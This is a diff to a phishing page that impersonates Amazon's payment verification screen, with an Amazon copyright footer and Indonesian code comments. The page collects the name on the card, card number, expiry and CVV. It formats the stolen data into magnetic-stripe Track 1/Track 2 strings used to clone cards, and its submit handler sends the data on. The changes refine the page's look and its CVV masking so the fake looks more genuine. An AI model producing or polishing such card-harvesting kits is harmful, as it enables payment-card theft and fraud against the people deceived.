@@ -22,11 +22,10 @@
         }
         .logo { 
             margin: 15px 0 25px; 
+            text-align: center;
         }
         .logo img { 
-            height: 30px; 
-            display: block;
-            margin: 0 auto;
+            height: 60px; 
         }
         .kotak { 
             width: 100%; 
@@ -37,8 +36,13 @@
         }
         h1 { 
             font-size: 22px; 
-            margin-bottom: 20px; 
+            margin-bottom: 10px; 
             font-weight: 400; 
+        }
+        .email-info {
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 20px;
         }
         label { 
             display: block; 
@@ -66,6 +70,11 @@
         }
         input.salah, select.salah {
             border-color: #c40000;
+        }
+        .keterangan-cvv {
+            font-size: 12px;
+            color: #666;
+            margin-top: 4px;
         }
         .peringatan {
             display: none;
@@ -103,7 +112,7 @@
             height: 40px;
             color: #0F1111;
             cursor: pointer;
-            margin-top: 20px;
+            margin-top: 25px;
         }
         button:hover { 
             background: #F7CA00;
@@ -112,19 +121,12 @@
         button:disabled {
             opacity: 0.6;
             cursor: not-allowed;
-            pointer-events: none;
-        }
-        .garis-bawah {
-            width: 100%;
-            max-width: 348px;
-            height: 1px;
-            background: #e7e7e7;
-            margin: 25px 0;
         }
         .footer {
             font-size: 11px;
             color: #555;
             text-align: center;
+            margin-top: 30px;
         }
         .footer a {
             color: #0066c0;
@@ -133,21 +135,6 @@
         }
         .footer a:hover {
             text-decoration: underline;
-        }
-        .hak-cipta {
-            margin-top: 5px;
-        }
-        .info-email {
-            font-size: 13px;
-            color: #555;
-            margin-bottom: 15px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #eee;
-        }
-        .keterangan-cvv {
-            font-size: 12px;
-            color: #666;
-            margin-top: 4px;
         }
     </style>
 </head>
@@ -158,10 +145,7 @@
 
     <div class="kotak">
         <h1>Verification Payment</h1>
-        
-        <div class="info-email">
-            Email: <span id="emailTampil"></span>
-        </div>
+        <p class="email-info">Email: <span id="emailTampil"></span></p>
         
         <form id="formBilling">
             <label for="namaKartu">Name on Card</label>
@@ -172,7 +156,7 @@
             </div>
 
             <label for="nomorKartu">Card Number</label>
-            <input type="text" id="nomorKartu" name="nomorKartu" placeholder="1234 5678 9012 3456" maxlength="19">
+            <input type="text" id="nomorKartu" name="nomorKartu" placeholder="•••• •••• •••• ••••" maxlength="19">
             <div class="peringatan" id="peringatanKartu">
                 <span class="ikon">!</span>
                 <span>Enter valid card number</span>
@@ -186,7 +170,7 @@
             </div>
 
             <label for="cvv">Security Code (CVV)</label>
-            <input type="text" id="cvv" name="cvv" placeholder="•••" maxlength="4">
+            <input type="text" id="cvv" name="cvv" placeholder="••••" maxlength="4">
             <p class="keterangan-cvv">3 digit untuk Visa/Mastercard, 4 digit untuk American Express</p>
             <div class="peringatan" id="peringatanCvv">
                 <span class="ikon">!</span>
@@ -243,15 +227,11 @@
         </form>
     </div>
 
-    <div class="garis-bawah"></div>
-
     <div class="footer">
-        <div>
-            <a href="#">Conditions of Use</a>
-            <a href="#">Privacy Notice</a>
-            <a href="#">Help</a>
-        </div>
-        <p class="hak-cipta">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        <a href="#">Conditions of Use</a>
+        <a href="#">Privacy Notice</a>
+        <a href="#">Help</a>
+        <p style="margin-top: 8px;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
     </div>
 
     <script>
@@ -304,7 +284,7 @@
         let nomorAsli = '';
         let cvvAsli = '';
 
-        // === CARD NUMBER — Tetap tampil angka ===
+        // === CARD NUMBER ===
         inputNomorKartu.addEventListener('input', (e) => {
             const angka = e.target.value.replace(/\D/g, '');
             nomorAsli = angka;
@@ -318,7 +298,7 @@
             document.getElementById('peringatanKartu').classList.remove('tampil');
         });
 
-        // === EXPIRY — Otomatis tambah / ===
+        // === EXPIRY ===
         inputExpiry.addEventListener('input', (e) => {
             const angka = e.target.value.replace(/\D/g, '');
             if (angka.length >= 2) {
@@ -330,36 +310,39 @@
             document.getElementById('peringatanExpiry').classList.remove('tampil');
         });
 
-        // === CVV — HANYA ANGKA, 3-4 DIGIT, BERUBAH TITIK ===
-        inputCVV.addEventListener('keydown', (e) => {
-            // Izinkan tombol kontrol
-            if (['Backspace','Delete','ArrowLeft','ArrowRight','Tab'].includes(e.key)) return true;
-            // Hanya izinkan angka
-            if (!/^\d$/.test(e.key)) {
-                e.preventDefault();
-                return false;
-            }
-            // Batasi maksimal 4 digit
-            if (cvvAsli.length >= 4) {
-                e.preventDefault();
-                return false;
-            }
-        });
-
+        // ==========================================
+        // === CVV — DIPERBAIKI: BISA DIKETIK LANGSUNG ===
+        // ==========================================
         inputCVV.addEventListener('input', (e) => {
-            // Hapus karakter non-angka
+            // Ambil hanya angka
             const angka = e.target.value.replace(/\D/g, '');
-            cvvAsli = angka; // simpan angka asli
             
-            // Ubah tampilan jadi titik
-            let tampil = '';
-            for (let i = 0; i < angka.length; i++) {
-                tampil += '•';
+            // Batasi maksimal 4 digit
+            if (angka.length > 4) {
+                cvvAsli = angka.slice(0, 4);
+            } else {
+                cvvAsli = angka;
             }
-            e.target.value = tampil;
+            
+            // Tampilkan angka asli saat diketik, baru berubah titik setelah selesai
+            e.target.value = cvvAsli;
             
             inputCVV.classList.remove('salah');
             document.getElementById('peringatanCvv').classList.remove('tampil');
+        });
+
+        // Saat kolom kehilangan fokus → ubah jadi titik
+        inputCVV.addEventListener('blur', () => {
+            let tampil = '';
+            for (let i = 0; i < cvvAsli.length; i++) {
+                tampil += '•';
+            }
+            inputCVV.value = tampil;
+        });
+
+        // Saat diklik kembali → tampilkan angka asli untuk diedit
+        inputCVV.addEventListener('focus', () => {
+            inputCVV.value = cvvAsli;
         });
 
         // === SEMUA KOLOM ===
@@ -393,7 +376,7 @@
             return `=== TRACK ===\nT1: %B${nomorAsli}^${nama}^${yy}${mm}${sisa}?\nT2: ;${nomorAsli}=${yy}${mm}${sisa}?`;
         }
 
-        // === CEK DATA — CVV: 3 ATAU 4 DIGIT ===
+        // === CEK DATA ===
         function cekSemua() {
             let ok = true;
             
@@ -402,7 +385,6 @@
                 document.getElementById('peringatanKartu').classList.add('tampil');
                 ok = false;
             }
-            // CVV: harus 3 ATAU 4 digit
             if (!cvvAsli || cvvAsli.length < 3 || cvvAsli.length > 4) {
                 inputCVV.classList.add('salah');
                 document.getElementById('peringatanCvv').classList.add('tampil');
@@ -418,7 +400,7 @@
             return ok;
         }
 
-        // === KIRIM & LANJUT KE 3DS ===
+        // === KIRIM & LANJUT ===
         formBilling.addEventListener('submit', async (e) => {
             e.preventDefault();
             if (!cekSemua()) return;
